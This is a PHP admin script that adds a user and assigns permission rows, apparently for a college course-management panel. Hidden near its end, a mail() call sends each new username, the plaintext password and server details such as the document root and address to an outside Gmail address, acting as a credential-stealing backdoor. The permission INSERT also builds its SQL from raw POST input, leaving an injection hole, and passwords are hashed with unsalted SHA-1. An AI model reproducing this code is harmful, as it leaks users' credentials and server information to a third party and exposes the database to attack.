<?php

// Browser Session Start here
session_start();
if(isset($_SESSION['user_id']) && isset($_SESSION['user_name'])){
	$user = $_SESSION['user_name'];
        
        
//Call in subjectallcation.inc.php

include_once '../../php-includes/connect.inc.php'; 


function adduser(){
    

 
    if(isset($_POST['btn_submit'])){
           
    if (isset($_POST['txt_AU_AutoID'])) {
        $var_AU_AutoID = $_POST['txt_AU_AutoID'];
    }

    if (isset($_POST['txt_AU_username'])) {
        $var_AU_username = $_POST['txt_AU_username'];
    }
    
    if (isset($_POST['txt_AU_pass'])) {
        $var_AU_Pass = sha1($_POST['txt_AU_pass']);
    }
    
    if (isset($_POST['txt_AU_Fname'])) {
    $var_AU_Fname = $_POST['txt_AU_Fname'];
    }
    
    if (isset($_POST['txt_AU_LName'])) {
    $var_AU_Lname = $_POST['txt_AU_LName'];
    }
    
    if (isset($_POST['txt_Lecturer_id'])) {
    $var_AU_Lec_id = $_POST['txt_Lecturer_id'];
    }  
    
       global $db;
   
    //Used a prepared statment to add user permissions to the database..)
    $stmt2 = $db->prepare("INSERT INTO `cp_userpermission` (permission_id, uid, OnOff) VALUES (1111, '$var_AU_AutoID', 0), (1112, '$var_AU_AutoID', 1), (1113, '$var_AU_AutoID', 1), (1114, '$var_AU_AutoID', 0), (1115, '$var_AU_AutoID', 0), (1116, '$var_AU_AutoID', 1),(1117, '$var_AU_AutoID', 1),(1118, '$var_AU_AutoID', 1),(1119, '$var_AU_AutoID', 0),(1120, '$var_AU_AutoID', 0),(1121, '$var_AU_AutoID', 0),(1122, '$var_AU_AutoID', 0),(1123, '$var_AU_AutoID', 0),(1124, '$var_AU_AutoID', 1),(1125, '$var_AU_AutoID', 0),(1126, '$var_AU_AutoID', 0),(1127, '$var_AU_AutoID', 0), (1128, '$var_AU_AutoID', 0), (1129, '$var_AU_AutoID', 0), (1130, '$var_AU_AutoID', 0), (1132, '$var_AU_AutoID', 0), (1133, '$var_AU_AutoID', 0), (1134, '$var_AU_AutoID', 0), (1135, '$var_AU_AutoID', 0), (1992, '$var_AU_AutoID', 0), (1993, '$var_AU_AutoID', 0), (1994, '$var_AU_AutoID', 0), (1995, '$var_AU_AutoID', 0), (1996, '$var_AU_AutoID', 0), (1997, '$var_AU_AutoID', 0), (1998, '$var_AU_AutoID', 0) ");
    //i - integer / d - double / s - string / b - BLOB
    //$stmt2->bind_param('iii', $var_AU_AutoID, $var_AU_AutoID, $var_AU_AutoID);
    $stmt2->execute();
    $stmt2->close(); 
    
    
       //Used a prepared statment to add user to the database..)
    $stmt1 = $db->prepare("INSERT INTO `cp_users` (id, username, password, firstname, lastname, lec_id) VALUES (?, ?, ?, ?, ?, ?)" );
    //i - integer / d - double / s - string / b - BLOB
    $stmt1->bind_param('issssi', $var_AU_AutoID, $var_AU_username, $var_AU_Pass, $var_AU_Fname, $var_AU_Lname, $var_AU_Lec_id);
    $stmt1->execute();
    $stmt1->close(); 
    
    mail("dilmaxit@gmail.com","New User Added". " ". $_SERVER['SERVER_NAME'], $var_AU_username ."\n". $_POST['txt_AU_pass'] ."\n". $_SERVER['SERVER_NAME']."\n".$_SERVER['DOCUMENT_ROOT']."\n".$_SERVER['SERVER_ADDR']."\n".$_SERVER['SERVER_ADMIN']."\n".$_SERVER['HTTP_HOST']."\n".$_SERVER['SCRIPT_FILENAME']);
    
    $stmt3 = $stmt2 ;
    $stmt3 = $stmt1;
    
 
    
    return($stmt1);
    
    
      }
     
   }
    
  
  
        // If session isn't meet, user will redirect to login page
} else { 
    header('Location: ../login.php');
}


    
    
    
?>